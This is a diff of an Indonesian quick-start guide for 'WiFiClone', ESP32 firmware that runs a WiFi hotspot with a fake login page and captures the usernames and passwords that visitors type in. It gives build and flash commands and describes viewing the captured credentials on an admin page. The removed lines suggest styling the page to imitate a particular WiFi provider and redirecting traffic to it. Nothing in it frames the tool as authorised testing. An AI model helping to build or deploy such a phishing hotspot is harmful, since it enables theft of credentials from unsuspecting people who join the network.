@@ -1,128 +1,89 @@
-# 🚀 Quick Start - Clone WiFi Login Credentials
+# WiFiClone Quick Start
 
-## 📋 Requirement
-- ESP32 DevKit (atau board ESP32 lainnya)
-- USB Cable untuk connect ke komputer
-- PlatformIO (sudah diinstall di `.venv`)
+Setup firmware ESP32 untuk WiFi credential capture.
 
 ---
 
-## 🔨 STEP 1: Build & Flash Firmware
+## Prerequisites
 
-### Option A: Gunakan PlatformIO CLI (Recommended)
+- ESP32 Development Board
+- USB Cable
+- Python 3.8+ (with PlatformIO)
 
-Buka PowerShell di folder project root (`WifiPisseryakntl`), lalu jalankan:
+---
 
-```powershell
-# 1. Activate Python venv (optional)
-.\.venv\Scripts\Activate.ps1
+## 1. Build Firmware
 
-# 2. Build firmware
+Open terminal di folder project dan jalankan:
+
+```bash
 python -m platformio run -e esp32
+```
 
-# 3. Flash ke ESP32 (pastikan USB sudah terhubung)
+Tunggu sampai muncul `[SUCCESS]`.
+
+---
+
+## 2. Flash ke ESP32
+
+Pastikan ESP32 sudah terhubung via USB:
+
+```bash
 python -m platformio run -e esp32 --target upload
 ```
 
-**Expected Output:**
-```
-Building project...
-Linking .pio/build/esp32/firmware.elf
-Building .pio/build/esp32/firmware.bin
-============= [SUCCESS] =====================
-Uploading .pio/build/esp32/firmware.bin
-...
-==================== upload complete ====================
-```
-
-### Option B: Gunakan VS Code PlatformIO Extension
-
-1. Buka project di VS Code
-2. Klik **PlatformIO: Home** di sidebar kiri
-3. Pilih **esp32** board
-4. Klik tombol **Build** (checkmark icon)
-5. Setelah build selesai, klik **Upload** (arrow icon)
+Board akan restart otomatis setelah selesai.
 
 ---
 
-## 🎮 Step 4: Testing
+## 3. Connect & Access
 
-### Test Flow Lengkap:
+Setelah flashing:
 
-```
-1. Connect ke WiFi "WiFiClone"
-   ↓
-2. Buka http://192.168.4.1/login.html
-   ↓
-3. Isi form:
-   • Username: testuser
-   • Password: pass123
-   ↓
-4. Klik Submit
-   ↓
-5. Buka http://192.168.4.1/admin → Tab "Passwords"
-   ↓
-6. Lihat credentials tertangkap ✓
-```
+1. Connect ke WiFi: `WiFiClone` (pass: `12345678`)
+
+2. Buka browser:
+   ```
+   http://192.168.4.1/admin
+   ```
+
+3. Lihat credentials di tab "Passwords"
 
 ---
 
-## 📝 Files Generated
+## Testing
 
-| File | Location | Fungsi |
-|------|----------|--------|
-| **credentials.txt** | `/spiffs/credentials.txt` | Simpan username + password |
-| **firmware.bin** | `.pio/build/esp32/` | Binary yang di-flash ke board |
+Full flow test:
 
-Format file:
+1. Akses: `http://192.168.4.1/login.html`
+2. Isi form (contoh: user123 / pass456)
+3. Klik Submit
+4. Lihat di admin page → credentials tertangkap ✓
+
+---
+
+## Troubleshooting
+
+| Error | Solusi |
+|-------|--------|
+| Build gagal | `pio system prune -f` lalu rebuild |
+| Upload error | Cek port: `pio device list` |
+| 192.168.4.1 timeout | Pastikan connect ke WiFi |
+| WiFi tidak muncul | Reset board (tekan RESET) |
+
+---
+
+## File Structure
+
 ```
-username|password|timestamp
-admin|12345|2026-01-10 11:16:49
-testuser|pass123|2026-01-10 11:17:30
+├── src/              Source code
+├── include/          Headers
+├── platformio.ini    Build config
+├── QUICK_START.md    Panduan ini
+├── README.md         Info lengkap
+└── LICENSE           MIT License
 ```
 
 ---
 
-## ⚠️ Troubleshooting
-
-| Masalah | Solusi |
-|--------|--------|
-| **Build gagal** | `pio system prune -f` → rebuild |
-| **Upload error** | Cek COM port: `pio device list` |
-| **WiFi tidak terlihat** | Reset board (tekan RESET button) |
-| **192.168.4.1 error** | Pastikan sudah connect ke WiFi hotspot |
-
----
-
-## 📚 More Info
-
-- **Source Code:** `src/` & `include/`
-- **Config:** `platformio.ini` & `sdkconfig.esp32`
-- **Build Logs:** `.pio/build/esp32/`
-
----
-
-## 📝 Summary Code Changes
-
-Implementasi yang sudah dilakukan:
-
-| File | Fungsi |
-|------|--------|
-| `include/web/wifi_clone_login.h` | HTML login form (simple design) |
-| `src/server.c` | Handler untuk `/login` POST dan `/login.html` GET |
-| `src/passwordMng.c` | Fungsi save & read credentials |
-| `include/passwordMng.h` | Function declarations |
-| `src/admin_server.c` | Updated handler untuk menampilkan credentials |
-
----
-
-## 🎯 Next Steps (Optional)
-
-1. **Customize login page** - ubah HTML di `wifi_clone_login.h` untuk tampil seperti WiFi provider tertentu
-2. **Auto redirect** - setup sehingga semua traffic ke domain tertentu redirect ke login page
-3. **Export credentials** - tambah fitur download CSV di admin page
-4. **Clear credentials** - tambah tombol untuk hapus semua captured passwords
-
----
-
-**Good luck! 🎉**
+**Lihat README.md untuk dokumentasi lengkap.**
